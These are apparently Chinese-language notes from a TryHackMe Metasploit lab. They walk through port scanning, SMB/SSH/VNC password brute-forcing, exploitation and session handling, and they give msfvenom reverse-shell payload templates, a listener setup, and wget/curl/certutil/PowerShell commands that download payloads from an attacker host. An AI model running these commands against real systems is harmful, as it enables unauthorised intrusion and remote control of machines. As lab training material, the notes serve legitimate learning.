> **实战场景：** 拿到一台未知靶机，需要进行信息收集与服务爆破。

### 扫描

#### 1. 端口扫描（建议直接调用 Nmap）

> _MSF 自带的 TCP 端口扫描（`auxiliary/scanner/portscan/tcp`）默认只扫 1-10000 端口，容易漏掉重要服务（如 8000 或 10000+ 的高位端口）。_

- **最稳打法：** 在 `msfconsole` 中直接调用 Nmap 扫全端口：

```bash
nmap -sS -p- 靶机IP
```

**为什么在 MSF 里直接打 `nmap -p-`？**  
	因为 MSF 内部的 `tcp` 扫描模块比较慢且默认范围有限。在渗透测试实战中，**“先 Nmap 扫全端口 -> 再进 MSF 用特定服务扫描/爆破模块”** 是最高效的标准操作流程。

#### 2. 服务识别 (UDP NetBIOS 扫描)

> _用于快速识别局域网内的主机名（如 `JON-PC`），并探明是否开启共享服务。_

- **使用模块：** `auxiliary/scanner/discovery/udp_sweep`
- **实操命令：**

```bash
use auxiliary/scanner/discovery/udp_sweep
set RHOSTS 靶机IP
run
```

#### 3. 服务暴力破解 (SMB/SSH 密码爆破)

> _当目标开放 445 (SMB) 或 22 (SSH) 端口，且存在已知用户名时，可用此模块撞库。_

- **使用模块：** `auxiliary/scanner/smb/smb_login` (SMB爆破) 或 `auxiliary/scanner/ssh/ssh_login` (SSH爆破)
- **参数核心配置：**

```bash
set RHOSTS 靶机IP           # 目标 IP
set USERNAME 已知用户名      # 指定用户名 (如 penny)
set PASS_FILE 字典文件路径   # 指定密码字典 （这个房间给的字典）
set VERBOSE false           # 关闭啰嗦输出，只看成功结果
set STOP_ON_SUCCESS true    # 一旦找到正确密码，立刻停止爆破
run
```

- **避坑小贴士：** 在 TryHackMe 中，字典通常指定在这里：`/usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt`。如果题目要求用指定字典，一定要填这个路径！


### MSF之数据库

> **为什么需要数据库？**  
> 现实渗透测试通常面对多台目标机器（如 `/24` 网段），手动记 IP 容易乱。MSF 集成了 PostgreSQL 数据库，用于集中存储主机、服务、漏洞等信息，实现项目管理。

#### 1. 数据库初始化（如果你用本地 Kali）

- **启动数据库**：`systemctl start postgresql`
- **初始化数据库**：`sudo -u postgres msfdb init`
	- 新版kali的话用`sudo msfdb init`执行
- **检查连接状态**：在 `msfconsole` 里敲 `db_status`，如果显示 `Connected to msf. Connection type: postgresql.`，说明数据库就绪。

#### 2. 工作区（Workspace）管理

- **作用**：分离不同项目的数据（例如分开发环境、测试环境、内网渗透）。
- **查看当前工作区**：`workspace`
- **新建工作区**：`workspace -a <项目名>`（如 `workspace -a tryhackme`）
- **切换工作区**：`workspace <项目名>`

#### 3. 核心数据库命令（**重点！**）

- **`db_nmap`**：代替普通的 `nmap`，扫描结果**自动存入数据库**。
- **`hosts`**：查看数据库里所有已发现的靶机 IP。
- **`services`**：查看数据库里所有已发现的服务（端口、协议、服务名）。
- **`vulns`**：查看发现的所有漏洞信息。
- **`db_import`**：将外部 Nmap XML 结果导入数据库（无网环境非常有用）。

#### 4. 自动化批处理工作流（**最实用的地方**）

当你有多台靶机时：

1. 先用 `db_nmap -sV -p- 10.10.12.229` 扫描所有主机。
2. 下次进入一个扫描模块时（如 `smb_ms17_010`），直接敲 **`hosts -R`**，MSF 会自动从数据库里把目标 IP 填入 `RHOSTS`，不用手动输。
3. 如果想找特定服务（如找开放 445 的机器）：`services -S smb` 即可快速过滤。


### 漏洞扫描与“低垂果实”挖掘

####  核心概念：“低垂果实” (Low-Hanging Fruit)

在渗透测试中，“低垂果实”指的是那些**识别容易、利用简单**的漏洞或配置错误。即使它们不一定能直接获得最高权限，但往往能帮助攻击者**在目标系统上建立初步的立足点（Foothold）**，从而为后续提权铺路。

---

#### 2. 工作流：发现服务 -> 搜索模块 -> 精准打击

Metasploit 的优势在于其庞大的模块库。高效利用它的前提是：**信息收集（扫描/指纹识别）做得越细，MSF 能提供的模块就越精准。**

**实战举例（VNC 服务）：**

- **情境**：假设你通过 Nmap 发现目标开启了 5900 端口（VNC 服务）。
- **行动**：在 `msf6 >` 中，使用 `search` 命令搜索与 VNC 相关的模块：

```bash
search vnc
```
- **选型**：搜索结果会列出辅助扫描模块（如 `auxiliary/scanner/vnc/vnc_login`）。使用 `info` 命令深入了解该模块：

```bash
info auxiliary/scanner/vnc/vnc_login
```

- **作用**：通过 `info`，你可以看到模块的作者、所需参数（如 `PASS_FILE` 字典路径）、以及功能描述（用于暴力破解 VNC 密码）。

---

#### 3. 常用思路拓展：查找特定服务的模块

不仅限于 VNC，面对任何服务（FTP、SMTP、MySQL 等），这套流程都通用：

- `search smtp relay` -> 查找检查 SMTP 开放中继的模块。
- `search ftp anonymous` -> 查找检查 FTP 匿名登录的模块。
- `search <服务名> <关键词>` -> 主动挖掘潜在攻击面。

---

#### 4. 必知技巧：利用 `info` 找作者 (常见考题)


- **解决办法**：先 `search` 找到模块路径，然后 **`info <模块路径>`**。
- **查找位置**：在输出的信息中，找到 **`Provided by:`** 这一行即可看到作者名。（如 `smtp_relay` 模块的作者是 `dmohanty`）。

### 漏洞利用与会话管理

#### 核心目标：打穿靶机，获取交互式 Shell

- **MSF 本质**：Metasploit 首先是个**利用框架**，Exploit（漏洞利用模块）是它的核心。
- **一个深刻的道理**：攻击能否成功，**不仅取决于 Exploit 本身，更取决于你对目标系统的了解程度**不要盲目打，先做足信息收集。

---

#### 🛠️ 关键操作流（新手易错点高亮）

**1. 挑武器：选定 Payload**

- **查看可用载荷**：`show payloads`

    - 注意：同一个漏洞可能会适配多种载荷。因为目标环境复杂（有无防火墙、杀毒软件、特定语言环境），这个过程通常需要**试错（Trial and Error）**。

- **更换载荷**：`set payload <编号或路径>`

- **⚠️ 强烈建议**：更换 Payload 后，**必须立刻再次执行 `show options`**，因为新的 Payload 可能会有新需求（如新出现一个 `LHOST` 或 `LPORT`）。

**2. 填参数：配置攻击选项**

- **常用两项核心必填**：
	- `set RHOSTS <靶机IP>` 和 `set LHOST <本机VPN IP>`。
    - _技巧_：`LHOST` 千万别填错！如果是在 THM 中，`LHOST` 是你 `tun0` 网卡的 IP（不是你本地的 WiFi IP）。
- **全检查**：再次输入 `show options`，确认所需项都已填写。

**3. 扣扳机：执行攻击**

- **发起攻击**：`exploit` 或 `run`。
- ** 成功标志**：看到 `Command shell session X opened` 字样。
- **成功后的界面变化**：提示符会变成目标机器的 CMD 界面（如 `C:\Windows\system32>`）。
    
---

####  高级玩法：会话管理（Session Management）

拿到 Shell 只是第一步，**如何在多个目标之间自由切换**才是渗透测试的关键。

**· 把 Shell 放进后台（挂机）**  
当你在目标 Shell 里时，按键盘 **`CTRL + Z`**，然后输入 **`y`** 确认。或者直接输入 `background` 命令。
- _作用_：可以把当前 Shell 挂起，回到 `msf6 >` 界面去做其他事。

**· 查看现有会话**  
命令：`sessions` 或 `sessions -l`
- _你会看到_：每个会话都有独一无二的 `Id` 号（如 1, 2, 3）。

**· 重新进入某个会话**  
命令：`sessions -i <会话ID>`（如 `sessions -i 1`）。
- _作用_：回到目标机器的 CMD 命令行。

**· 常用附加指令**
- `-K`：一键杀死所有活跃会话。
- `-k <ID>`：杀死指定编号的会话。
- `-u <ID>`：**（神技）** 将普通的 `shell` 会话**升级**为权限更大、功能更强的 `meterpreter` 会话。


###  Msfvenom：定制化攻击载荷生成指南

#### 1. 什么是 Msfvenom？

Msfvenom 是 Metasploit 框架中用于**生成和编码 Payload** 的命令行工具。它整合了旧版的 `msfpayload` 和 `msfencode`，可以生成多种格式（如 `.exe`, `.elf`, `.php`, `.asp`, `.py`）和针对多种系统（Windows, Linux, Android, macOS）的载荷。

#### 2. 核心概念

##### 载荷（Payloads）

- **查看所有可用载荷**：`msfvenom -l payloads`
    
- **常见分类**：
    
    - `reverse_tcp`：目标主动连接攻击机（最常用，能穿透 NAT/防火墙）。
        
    - `bind_tcp`：目标在本地开放端口，攻击机主动连接（容易被防火墙拦截）。
        

##### 输出格式（Formats）

- **查看支持格式**：`msfvenom -l formats`
    
- **常见格式**：`exe` (Windows), `elf` (Linux), `raw` (原始代码), `asp`/`aspx`, `php`, `py` (Python)。
    

##### 编码器（Encoders）

- **注意误区**：编码器**不是为了绕过杀毒软件（AV）** 设计的，它主要是对 Payload 进行“变形”以防止网络传输时被损坏，或者规避某些简单的签名检测。
    
- **使用参数**：`-e <编码器名称>` （如 `-e php/base64`）。
    
- _高级说明_：想真正绕过 AV，需要配合混淆器（如 `Veil`）或自定义 Shellcode，单独靠 msfvenom 编码在现代 AV 面前收效甚微。
    

---

#### 3. 实战命令模板（核心笔记！）

**Windows（生成 `.exe`）**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<你的IP> LPORT=<监听端口> -f exe -o payload.exe
```

**Linux（生成.elf）**

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<你的IP> LPORT=<监听端口> -f elf -o payload.elf
```

**PHP（生成 `.php` 脚本）**

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<你的IP> LPORT=<监听端口> -f raw > payload.php
```

（注：生成的原始 PHP 文件通常需要手动补全首尾的 `<?php` 和 `?>` 标签，并删掉注释才能正常执行。）

**ASP / Python**

```bash
# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<你的IP> LPORT=<监听端口> -f asp > payload.asp

# Python
msfvenom -p cmd/unix/reverse_python LHOST=<你的IP> LPORT=<监听端口> -f raw > payload.py
```


#### 4、配套使用：启动监听器（Handler）

生成 Payload 后，你必须在本地 MSF 里开启一个监听器（Handler）来接收反弹回来的 Shell。

**标准操作流程：**

```bash
use exploit/multi/handler
set payload <你刚才生成时用的payload名称>   # 必须完全对应！
set LHOST <你的IP>                         # 必须与生成时一致
set LPORT <你的监听端口>                    # 必须与生成时一致
exploit -j                                 # 或者 run 进行前台等待
```

**为什么默认用反弹 Shell？**

- **反向（Reverse）**：目标主动连接攻击者。穿透防火墙能力强，是渗透测试的首选。
- **正向（Bind）**：攻击者主动连接目标。容易被防火墙拦截，仅在目标无法上网或极其特殊的网络环境下使用。
- **命名标识**：`reverse_tcp` 表示反弹，`bind_tcp` 表示正向。

### 5. 传输技巧（如何把木马扔到目标上）

生成木马后，你不能直接贴进去，需要搭建一个临时的下载通道。

**在攻击机上开启 HTTP 服务：**

```bash
python3 -m http.server 8080
```

(此时攻击机的 `http://你的IP:8080/` 目录下所有文件均可供下载。)

**在目标机上通过命令行下载：**

- **Linux (wget)**：`wget http://攻击机IP:8080/payload.elf`
- **Linux (curl)**：`curl -o payload.elf http://攻击机IP:8080/payload.elf`
- **Windows (certutil)**：`certutil -urlcache -f http://攻击机IP:8080/payload.exe payload.exe`
- **Windows (PowerShell)**：`Invoke-WebRequest -Uri http://攻击机IP:8080/payload.exe -OutFile payload.exe`


###  6. 常见避坑

- **Payload 类型与 Handler 必须一致**：如果你生成的是 `windows/meterpreter/reverse_tcp`，在 Handler 里设置 Payload 时也必须是这一个。如果用了 `php/reverse_php`，监听器也要换成对应的。
- **LHOST 必须准确**：如果是在打靶场，`LHOST` 通常是 **VPN 网卡（如 `tun0`）的 IP**，而不是本地的 `127.0.0.1` 或 `192.168.x.x`。靶机只有通过 VPN 网段才能找到你。
- **权限问题**：Linux 机器上的 `.elf` 文件下载下来后通常没有执行权限，需要执行 `chmod +x payload.elf`